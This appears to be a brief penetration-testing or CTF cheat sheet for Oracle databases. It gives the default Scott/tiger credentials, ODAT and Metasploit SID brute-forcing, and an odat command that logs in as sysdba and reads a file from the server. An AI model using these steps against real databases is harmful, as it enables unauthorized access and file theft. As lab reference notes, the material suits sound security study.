# Oracle / ODAT

## Basic credentials
``` 
Username --> Scott 
Password --> tiger
```

## Attacks and exploits
### Brute force SID  
**[HELP](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)**       
1. Use: `odat` and its `sidguesser` to bruteforce with a link provided
2. Use metasploit and use `auxiliary(admin/oracle/sid_brute)`
3. Use `sqlplus` to login with the creds or
    1. Read file with odat:    
    ```sh
    odat ctxsys -s <ip> -d XE -U SCOTT -P tiger --sysdba --getFile flag.txt
    ```